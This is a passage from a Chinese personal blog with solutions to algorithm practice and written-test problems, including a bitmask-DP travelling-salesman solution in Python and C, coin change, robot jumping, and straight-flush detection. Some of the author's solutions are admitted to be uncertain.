class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">instance_count = <span class="built_in">int</span>(sys.stdin.readline())</span><br><span class="line">result_lst = []</span><br><span class="line"><span class="keyword">for</span> instance <span class="keyword">in</span> <span class="built_in">range</span>(instance_count):</span><br><span class="line">    max_length = <span class="number">0</span></span><br><span class="line">    animation_dict = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">    frame_count = <span class="built_in">int</span>(sys.stdin.readline())</span><br><span class="line">    <span class="keyword">for</span> frame_index <span class="keyword">in</span> <span class="built_in">range</span>(frame_count):</span><br><span class="line">        frame_input = sys.stdin.readline().strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        feature_pool = []</span><br><span class="line">        feature_num = <span class="built_in">int</span>(frame_input[<span class="number">0</span>])</span><br><span class="line">        features = frame_input[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> feature_index <span class="keyword">in</span> <span class="built_in">range</span>(feature_num):</span><br><span class="line">            feature = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            feature_length = <span class="built_in">len</span>(features)//feature_num</span><br><span class="line">            <span class="keyword">for</span> feature_pos <span class="keyword">in</span> <span class="built_in">range</span>(feature_length):</span><br><span class="line">                feature += features[feature_index*feature_length + feature_pos]</span><br><span class="line">                feature += <span class="string">&#x27; &#x27;</span></span><br><span class="line">            feature_pool.append(feature)</span><br><span class="line"></span><br><span class="line">        keys = <span class="built_in">list</span>(animation_dict.keys())</span><br><span class="line">        <span class="keyword">for</span> feature <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">if</span> feature <span class="keyword">in</span> feature_pool:</span><br><span class="line">                animation_dict[feature] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                value = animation_dict.pop(feature)</span><br><span class="line">                <span class="keyword">if</span> value &gt; max_length:</span><br><span class="line">                    max_length = value</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> feature <span class="keyword">in</span> feature_pool:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> animation_dict[feature]:</span><br><span class="line">                animation_dict[feature] += <span class="number">1</span></span><br><span class="line">    max_length_in_dict = <span class="built_in">sorted</span>(animation_dict.values())[-<span class="number">1</span>]</span><br><span class="line">    max_length = max_length_in_dict <span class="keyword">if</span> max_length_in_dict &gt; max_length <span class="keyword">else</span> max_length</span><br><span class="line">    result_lst.append(max_length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> result_lst:</span><br><span class="line">    <span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure></p><h2 id="毕业旅行问题">毕业旅行问题</h2><p>小明目前在做一份毕业旅行的规划。打算从北京出发，分别去若干个城市，然后再回到北京，每个城市之间均乘坐高铁，且每个城市只去一次。由于经费有限，希望能够通过合理的路线安排尽可能的省一些路上的花销。给定一组城市和每对城市之间的火车票的价钱，找到每个城市只访问一次并返回起点的最小车费花销。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">4</span><br><span class="line">0 2 6 5</span><br><span class="line">2 0 4 4</span><br><span class="line">6 4 0 2</span><br><span class="line">5 4 2 0</span><br><span class="line">输出例子：</span><br><span class="line">13</span><br><span class="line">例子说明：</span><br><span class="line">共 4 个城市，城市 1 和城市 1 的车费为0，城市 1 和城市 2 之间的车费为 2，城市 1 和城市 3 之间的车费为 6，城市 1 和城市 4 之间的车费为 5，依次类推。假设任意两个城市之间均有单程票可购买，且票价在1000元以内，无需考虑极端情况。</span><br></pre></td></tr></table></figure><p>这题卡了,找chatgpt学了下思路,dp+bitmask的思路,贴下chatgpt的代码 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">min_cost</span>(<span class="params">cost</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(cost)</span><br><span class="line">    <span class="comment"># dp[mask][i]表示已经访问过的城市集合为mask，并且最后一次访问的城市是i时的最小花费</span></span><br><span class="line">    dp = [[<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; n)]</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>  <span class="comment"># 起点到达自己的花费为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mask <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1</span> &lt;&lt; n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> mask &amp; (<span class="number">1</span> &lt;&lt; i):  <span class="comment"># 如果第i个城市已经访问过了</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                    <span class="keyword">if</span> i != j <span class="keyword">and</span> mask &amp; (<span class="number">1</span> &lt;&lt; j):  <span class="comment"># 如果第j个城市也已经访问过了</span></span><br><span class="line">                        dp[mask][i] = <span class="built_in">min</span>(dp[mask][i], dp[mask ^ (<span class="number">1</span> &lt;&lt; i)][j] + cost[j][i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到从任意城市到达起点的最小花费</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(dp[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][j] + cost[j][<span class="number">0</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例测试</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cities = [<span class="string">&quot;北京&quot;</span>, <span class="string">&quot;上海&quot;</span>, <span class="string">&quot;广州&quot;</span>, <span class="string">&quot;成都&quot;</span>]</span><br><span class="line">    <span class="comment"># 以二维列表的形式给出每对城市之间的车费，如果不可达则用inf表示</span></span><br><span class="line">    ticket_cost = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">1000</span>],</span><br><span class="line">        [<span class="number">500</span>, <span class="number">0</span>, <span class="number">600</span>, <span class="number">700</span>],</span><br><span class="line">        [<span class="number">800</span>, <span class="number">600</span>, <span class="number">0</span>, <span class="number">900</span>],</span><br><span class="line">        [<span class="number">1000</span>, <span class="number">700</span>, <span class="number">900</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最小车费花销为:&quot;</span>, min_cost(ticket_cost))</span><br></pre></td></tr></table></figure></p><p>n个城市有2^n个状态,用二进制可以进行表示,最终状态位全1,dp列表一维表示到访过的城市掩码,二维表示最后到达的城市,其值表示能满足此条件的最低路径长度. 最终需要从城市回起点,在返回时再加一层判断即可. 代码没问题,不过python提交之后会TLE,想起之前密码学也有题python超时换c过了,于是用c重写了一下,成功通过. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cost</span><span class="params">(<span class="type">int</span> *cost, <span class="type">int</span> cities)</span>&#123;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">1</span>&lt;&lt;cities][cities];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span>&lt;&lt;cities); i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">            dp[i][j] = MAX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> mask = <span class="number">1</span>; mask &lt; (<span class="number">1</span>&lt;&lt;cities); mask++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cities; i++)&#123;</span><br><span class="line">            <span class="comment">// i is choosen</span></span><br><span class="line">            <span class="keyword">if</span>(mask &amp; (<span class="number">1</span> &lt;&lt; i))&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i != j &amp;&amp; mask &amp; (<span class="number">1</span> &lt;&lt; j))&#123;</span><br><span class="line">                        dp[mask][i] = min(dp[mask ^ (<span class="number">1</span> &lt;&lt; i)][j] + cost[j * cities + i], dp[mask][i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> min_cost = MAX;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; cities; k++)&#123;</span><br><span class="line">        min_cost = min(min_cost, dp[(<span class="number">1</span> &lt;&lt; cities) - <span class="number">1</span>][k] + cost[k * cities]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min_cost;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cities;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;cities);</span><br><span class="line">    <span class="type">int</span> costs[cities][cities];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; cities; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;costs[i][j]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, cost(*costs, cities));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="找零">找零</h2><p>Z国的货币系统包含面值1元、4元、16元、64元共计4种硬币，以及面值1024元的纸币。现在小Y使用1024元的纸币购买了一件价值为 N(0 &lt; N&lt;=1024 )的商品，请问最少他会收到多少硬币？ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">200</span><br><span class="line">输出例子：</span><br><span class="line">17</span><br><span class="line">例子说明：</span><br><span class="line">花200，需要找零824块，找12个64元硬币，3个16元硬币，2个4元硬币即可。</span><br></pre></td></tr></table></figure> 最基础的dp <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">paied = <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">money</span>):</span><br><span class="line">    dp = [<span class="number">1024</span>] * <span class="number">1024</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1024</span>):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">64</span>]:</span><br><span class="line">            dp[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">4</span>:</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">16</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">64</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>, dp[i-<span class="number">16</span>] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>, dp[i-<span class="number">16</span>] + <span class="number">1</span>, dp[i-<span class="number">64</span>] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> dp[money]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(solution(<span class="number">1024</span>-paied))</span><br></pre></td></tr></table></figure></p><h2 id="机器人跳跃问题">机器人跳跃问题</h2><p>机器人正在玩一个古老的基于DOS的游戏。游戏中有N+1座建筑——从0到N编号，从左到右排列。编号为0的建筑高度为0个单位，编号为i的建筑的高度为H(i)个单位。</p><p>起初， 机器人在编号为0的建筑处。每一步，它跳到下一个（右边）建筑。假设机器人在第k个建筑，且它现在的能量值是E, 下一步它将跳到第个k+1建筑。它将会得到或者失去正比于与H(k+1)与E之差的能量。如果 H(k+1) &gt; E 那么机器人就失去 H(k+1) - E 的能量值，否则它将得到 E - H(k+1) 的能量值。</p><p>游戏目标是到达第个N建筑，在这个过程中，能量值不能为负数个单位。现在的问题是机器人以多少能量值开始游戏，才可以保证成功完成游戏？ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">5</span><br><span class="line">3 4 3 2 4</span><br><span class="line">输出例子：</span><br><span class="line">4</span><br><span class="line">----------------</span><br><span class="line">输入例子：</span><br><span class="line">3</span><br><span class="line">4 4 4</span><br><span class="line">输出例子：</span><br><span class="line">4</span><br><span class="line">----------------</span><br><span class="line">输入例子：</span><br><span class="line">3</span><br><span class="line">1 6 4</span><br><span class="line">输出例子：</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p>描述非常诡异,不过其实是个数学问题 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1: X&gt;0</span><br><span class="line">2: X+(X-H1) &gt; 0                               </span><br><span class="line">3: X+(X-H1)+(2X-H1-H2) &gt; 0</span><br><span class="line">4: X+(X-H1)+(2X-H1-H2)+(4X-2H1-H2-H3) &gt; 0</span><br><span class="line"></span><br><span class="line">化简之后</span><br><span class="line">1:  X&gt;0</span><br><span class="line">2: 2X&gt;H1</span><br><span class="line">3: 4X&gt;2H1+H2</span><br><span class="line">4: 8X&gt;4H1+2H2+H3</span><br></pre></td></tr></table></figure> 所以后面满足前面一定满足</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line">heights = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, sys.stdin.readline().strip().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">h</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, count):</span><br><span class="line">        h[i] = h[i-<span class="number">1</span>] * <span class="number">2</span> + h[i]</span><br><span class="line">    <span class="keyword">return</span> math.ceil(h[-<span class="number">1</span>]/ (<span class="number">1</span>&lt;&lt;count))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(solution(heights))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>某厂算法笔试记录</title>
      <link href="/2023/08/21/%E6%9F%90%E5%8E%82%E7%AE%97%E6%B3%95%E7%AC%94%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/21/%E6%9F%90%E5%8E%82%E7%AE%97%E6%B3%95%E7%AC%94%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>第一次远程笔试,本来是以为leetcode类似,结果和预想的有点差别,然后测试用例和leetcode也不太一样,样例输入也不太相似, 做的很不理想. 大致记录下, 题目记得不是很清楚只能大概写下.</p><h2 id="使环上三点中任意两点距离大于k">使环上三点中任意两点距离大于k</h2><p>输入格式: n, k, a1, a2, a3 n为环上点的个数 k为间距大小 a1, a2, a3为指定点的位置,节点一次只能动一次,输出最少需要的移动次数</p><p>比如6, 2, 1, 2, 3. 我们需要将节点1往左移动一次,节点3往右一次即可满足,总共移动2次,所以应该返回2</p><p>笔试的时候想法是取三点任两点中距离中最小的两组, 从而确定最低需要的次数, 代码如下. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">least_move</span>(<span class="params">n, k, a1, a2, a3</span>):</span><br><span class="line">    <span class="comment"># 排除不满足的</span></span><br><span class="line">    <span class="keyword">if</span> n // <span class="number">3</span> &lt; k:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑环首尾相连</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">a, b</span>):</span><br><span class="line">        abs_v = <span class="built_in">abs</span>(a - b)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(abs_v, <span class="built_in">abs</span>(n - abs_v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    d = [distance(a1, a2), distance(a1, a3), distance(a2, a3)]</span><br><span class="line">    d.sort()</span><br><span class="line">    d.pop()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最近的两组都满足, 返回0</span></span><br><span class="line">    <span class="keyword">if</span> d[<span class="number">0</span>] &gt;= k <span class="keyword">and</span> d[<span class="number">1</span>] &gt;= k:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最近的两组都需移动到k距离</span></span><br><span class="line">    <span class="keyword">elif</span> d[<span class="number">0</span>] &lt; k <span class="keyword">and</span> d[<span class="number">1</span>] &lt; k:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * k - d[<span class="number">0</span>] - d[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 一组大于k, 一组小于k, 先移动中间再考虑移动小于k侧</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        larger = <span class="built_in">max</span>(d)</span><br><span class="line">        less = <span class="built_in">min</span>(d)</span><br><span class="line">        <span class="comment"># k - less 为中间点移向large,直到距离large为k还不满足只能移动less</span></span><br><span class="line">        <span class="comment"># 后者为中间点移向large过程中就满足了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(k - less, k - less - (larger - k))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(least_move(12, 4, 1, 2, 7))</span></span><br><span class="line"><span class="comment"># 应该是3, 2往右1次, 1往左2次</span></span><br></pre></td></tr></table></figure></p><h2 id="同花顺">同花顺</h2><p>给一堆输入, 检测其中的同花顺(仅5张), 感觉是针对c语言的,用python感觉简单不少,不过给出的样例过了但是提交之后结果错误,不是很理解哪里写错了.</p><p>这里简化一下问题, 给出一个字典, key为牌的大小, value为此牌的数量, 每找到一个同花顺, 字典中对应key的value-1(即不放回).</p><p>目标为找出手牌中最大同花顺数量</p><p>不确定写错没,这里直接写的检测所有同花顺的函数 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flush</span>(<span class="params">dict1</span>):</span><br><span class="line">    found = <span class="number">1</span></span><br><span class="line">    flush_list = []</span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> dict1.items():</span><br><span class="line">        <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">            keys.append(k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> found == <span class="number">1</span>:</span><br><span class="line">        found = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> right &lt; <span class="built_in">len</span>(keys):</span><br><span class="line">            <span class="keyword">if</span> keys[right] - keys[left] == right - left:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = right</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> right - left == <span class="number">5</span>:</span><br><span class="line">                found = <span class="number">1</span></span><br><span class="line">                flush_key = keys[left:right]</span><br><span class="line">                flush_list.append(flush_key)</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> flush_key:</span><br><span class="line">                    dict1[key] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                keys = []</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> dict1.items():</span><br><span class="line">                    <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">                        keys.append(k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flush_list</span><br><span class="line"><span class="comment"># test = &#123;1:2, 2:2, 3:2, 4:3, 5:3, 6:3, 7:1, 8:1, 9:1, 10:1&#125;</span></span><br><span class="line"><span class="comment"># print(flush(test))</span></span><br><span class="line"><span class="comment"># [[1, 2, 3, 4, 5], [1, 2, 3, 4, 5], [4, 5, 6, 7, 8]]</span></span><br></pre></td></tr></table></figure></p><h2 id="好数组">好数组</h2><p>给出一个长度为n的数组, 目标是让其变成n-1且仅n-1个元素相同的数组,具体记得不太清了,样例倒是记得一些 输入: [1, 2, 2, 2, 5] 输出: 1 解释: 只需要将1变为2即可</p><p>输入:[1, 1, 1] 输出1: 解释: 将随便一个1变成0或者2即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 好数组</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good_list</span>(<span class="params">lst</span>):</span><br><span class="line">    counter = Counter(lst)</span><br><span class="line">    keys = counter.keys()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(keys) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(keys) == <span class="number">2</span> <span class="keyword">and</span> (<span class="number">1</span> <span class="keyword">in</span> counter.values()):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    mean = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>(x)/<span class="built_in">len</span>(x)</span><br><span class="line">    sorted_list = <span 